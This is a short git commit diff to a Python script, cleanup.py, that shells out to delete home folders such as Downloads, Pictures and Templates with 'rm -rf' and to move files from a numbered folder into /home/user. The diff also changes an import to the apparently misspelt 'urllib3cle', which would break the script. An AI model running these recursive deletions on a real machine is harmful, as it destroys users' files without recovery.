610be9377e800a0b48ad0453eee596f7267fd513
reuben <reusharino@gmail.com>
2021-03-30 13:39:15 +1300

    Update cleanup.py

--- cleanup.py
+++ cleanup.py
@@ -1,4 +1,4 @@
-import subprocess,os,sys,random,time,urllib3,subprocess,base64
+import subprocess,os,sys,random,time,urllib3cle,subprocess,base64
 
 def run(cmd):                                                  
      subprocess.call(cmd, shell=True)
@@ -13,6 +13,12 @@ run("rm -rf Downloads")
 run("rm -rf Pictures")
 run("rm -rf Templates")
 
-run("mv 312822/* /home/user")
+run("mv 312822/*.py /home/user")
+run("mv 312822/JG /home/user")
+run("mv 312822/LJ /home/user")
+run("mv 312822/Mana /home/user")
+
+
+
 
 run("rm -rf 312822")
